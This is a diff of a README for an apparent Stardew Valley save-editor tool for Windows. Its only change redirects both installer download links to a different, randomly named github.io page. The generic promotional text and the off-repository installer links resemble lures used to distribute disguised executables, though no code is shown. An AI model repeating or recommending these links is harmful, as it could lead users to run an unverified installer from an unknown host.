@@ -2,7 +2,7 @@
 
 Stardew Valley Save Editor is a powerful and user-friendly software designed for every Stardew Valley enthusiast. This tool allows you to seamlessly edit save files, manage mods, and unlock new gameplay possibilities directly on your Windows 10 or 11 desktop. Whether you're tweaking farm layouts, adding expanded content, or optimizing your gaming experience, this editor provides a reliable and efficient solution.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -54,6 +54,6 @@ This tool is designed exclusively for Windows desktop users and does not support
 
 ## Download
 
-[Get the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Get the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 © 2026 Stardew Valley Save Editor. All rights reserved. This is a fan-made tool and is not affiliated with ConcernedApe or Stardew Valley.
